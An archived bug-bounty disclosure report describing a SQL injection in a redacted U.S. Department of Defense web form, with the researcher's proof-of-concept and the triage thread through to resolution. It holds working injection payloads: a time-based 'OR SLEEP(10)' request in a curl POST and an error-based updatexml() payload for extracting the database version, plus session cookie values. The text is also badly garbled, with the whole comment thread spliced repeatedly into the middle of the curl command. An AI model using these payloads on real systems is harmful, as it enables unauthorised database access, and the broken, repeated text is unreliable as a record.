---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
  - vuln/code-injection
  - vuln/privilege-escalation
  - impact/rce
  - trigger/admin-required
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2022-05-12
submitted: 2017-05-27T07:15:51.436Z
bounty_usd: null
votes: 11
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "cdl"
source: "https://hackerone.com/reports/232378"
title: "SQL Injection on https://████████/"
---
# SQL Injection on https://████████/

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 11 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-05-12

- Report: [https://hackerone.com/reports/232378](https://hackerone.com/reports/232378)
- CWE: SQL Injection
- Submitted: 2017-05-27T07:15:51.436Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
https://████ is vulnerable to SQL Injection.

**Description:**
The `███████` parameter in `https://█████████/██████` does not properly sanitize input, thus allowing an attacker to execute SQL queries on the server!

## Impact
This is a **high impact** vulnerability! I saw a list of tables which I'm guessing contain confidential information such as emails, usernames, passwords, etc! Attackers could likely leverage this to Remote Code Execution by finding admin credentials, then gaining unauthorized access to an admin panel! 

## Step-by-step Reproduction Instructions
#### Proof of Concept #1:
1. Open up your terminal!
2. Paste this command 

```
curl -i -s -k  -X 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
POST' \
    -H 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
Content-Type: application/x-www-form-urlencoded' -H 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
Referer: https://██████/██████████?█████████=K' -H 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
Upgrade-Insecure-Requests: 1' \
    -b 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \
    --data-binary 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
█████=K*\' OR SLEEP(10) AND \'aSgl\'=\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=███████&emailid2=█████████' \
    

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
https://██████/████████'
```
3. Now the server will sleep for 10 seconds and then respond! 


#### Proof of Concept #2: 
```
curl -i -s -k  -X 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
POST' \
    -H 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
